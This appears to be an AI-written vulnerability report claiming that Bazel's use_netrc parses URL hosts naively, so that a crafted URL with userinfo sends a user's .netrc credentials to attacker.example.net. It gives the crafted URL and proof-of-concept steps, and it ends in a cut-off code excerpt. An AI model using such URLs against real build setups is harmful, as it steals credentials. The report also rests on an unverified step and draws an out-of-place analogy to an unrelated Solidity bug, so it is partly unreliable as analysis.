Based on my research, I found a genuine analog in Bazel's Starlark repository-rule authentication logic.

### Title
Host mismatch in `use_netrc`'s naive URL parsing causes netrc credentials to be attached to attacker-controlled hosts - (File: tools/build_defs/repo/utils.bzl)

### Summary
`use_netrc` in `tools/build_defs/repo/utils.bzl` derives the "host" it uses to look up `.netrc` credentials by naively splitting the URL string on `"/"` and then `":"`, instead of parsing the URL per RFC 3986 authority rules (scheme://[userinfo@]host[:port]/path). A URL containing userinfo with an embedded colon causes this ad-hoc parser to extract the userinfo component as the "host," which can coincide with a victim's trusted, netrc-configured host name, while the actual HTTP connection is made to a completely different, attacker-controlled host present later in the authority.

### Finding Description
`use_netrc` computes the lookup key as: [1](#0-0) 

```
host = schemerest[1].split("/")[0].split(":")[0]
if host in netrc:
    authforhost = netrc[host]
```

For a well-formed URL this correctly extracts the host, but for a URL of the form `https://trusted.example.org:TOKEN@attacker.example.net/path`, RFC 3986 says the authority is `trusted.example.org:TOKEN@attacker.example.net`, where `trusted.example.org:TOKEN` is userinfo (user=`trusted.example.org`, password=`TOKEN`) and the real host is `attacker.example.net`. Because `use_netrc` only splits on `/` then `:`, it computes `host = "trusted.example.org"` — the userinfo username — rather than the true host `attacker.example.net`. If the victim's `.netrc` (read via `read_netrc`/`read_user_netrc`, called from `get_auth`) has a `machine trusted.example.org` entry with login/password, `use_netrc` will build an `Authorization`/basic-auth dict keyed to that URL and pass it to `ctx.download`/`ctx.download_and_extract`. [2](#0-1) 

The download layer subsequently performs an actual HTTP request against the URL's real host per standard URI parsing (i.e., `attacker.example.net`), while the Authorization header/credentials that were computed for `trusted.example.org` are still attached to that outgoing request — exfiltrating the victim's netrc secret to the attacker-controlled host.

This is the direct analog of the reported Solidity bug: `_transferAmount` checks one hardcoded representation of "native" (`NATIVE` address) but not the other valid representation (`address(0)`), so the wrong code path is taken and funds meant for native transfer get treated as ERC20. Here, `use_netrc` checks one representation of "the URL's host" (a naive split-based parse) instead of the true RFC 3986 authority-parsed host, so credentials meant for host A get attached to a request that is actually sent to host B.

### Impact Explanation
Because `http_archive`, `http_file`, and `http_jar` (and Bzlmod module fetching, which synthesizes `http_archive` calls from registry-provided `source.json` URLs) all funnel through `get_auth`/`use_netrc` for authentication, a hostile registry, mirror, or any other attacker who controls a fetched URL string (not just its target server) can craft a URL whose userinfo component impersonates a trusted, netrc-configured hostname. This causes the victim's stored `.netrc` credentials (login/password or bearer tokens configured via `auth_patterns`) for that trusted host to be sent instead to the attacker's own server — a credential-exfiltration bypass of the intended host-scoping of `.netrc`/`auth_patterns` credentials.

### Likelihood Explanation
Exploitability requires only that the attacker control one URL string consumed by a repository rule that also has `.netrc`/`auth_patterns` credentials configured for some host name that the attacker can predict or discover (e.g., an internal artifact mirror hostname referenced in the same organization's Bazel configuration). Since Bzlmod resolves external module archive URLs from registry JSON responses at build time, a malicious or compromised registry/mirror is a realistic, unprivileged "hostile origin server" as scoped by this analysis, making this readily reachable without any local machine or credential access.

### Recommendation
Replace the ad-hoc `split("/")`/`split(":")` host extraction in `use_netrc` (and any similar parsing in `get_auth`/`read_netrc` call sites) with a proper URI-authority parser that strips userinfo before extracting the host, ensuring the host used for `.netrc` credential lookup is identical to the host that will actually receive the HTTP connection. Additionally, consider rejecting or warning on URLs containing userinfo components entirely, since they are rarely legitimate for archive/file downloads and are a common phishing/host-confusion vector.

### Proof of Concept
A `src/test/shell/bazel/starlark_repository_test.sh`-style reproduction (extending the existing netrc test setup) would:
1. Create a `.netrc` with `machine trusted.example.org` + `login`/`password`.
2. Configure a repository rule (e.g. `http_file`) with `urls = ["https://trusted.example.org:SECRET@attacker.example.net/file"]` and the same `.netrc` via `netrc` attribute.
3. Point `attacker.example.net` at a locally-hosted stub server (as the existing tests do with `startup_server`) that logs the `Authorization` header of any incoming request.
4. Run `bazel build`, and observe that the stub server for `attacker.example.net` receives the `Authorization` header/credentials that were configured for `trusted.example.org`, confirming credentials computed for the wrong host reach an unintended destination.

def get_auth(ctx, urls):
    """Utility function to obtain the correct auth dict for a list of urls from .netrc file.

    Support optional netrc and auth_patterns attributes if available.

    Args:
      ctx: The repository context of the repository rule calling this utility
        function.
      urls: the list of urls to read

    Returns:
      the auth dict which can be passed to repository_ctx.download
    """
    if hasattr(ctx.attr, "netrc") and ctx.attr.netrc:
        netrc = read_netrc(ctx, ctx.attr.netrc)
    elif "NETRC" in ctx.os.environ:
        netrc = read_netrc(ctx, ctx.os.environ["NETRC"])
    else:
        netrc = read_user_netrc(ctx)
    auth_patterns = {}
    if hasattr(ctx.attr, "auth_patterns") and ctx.attr.auth_patterns:
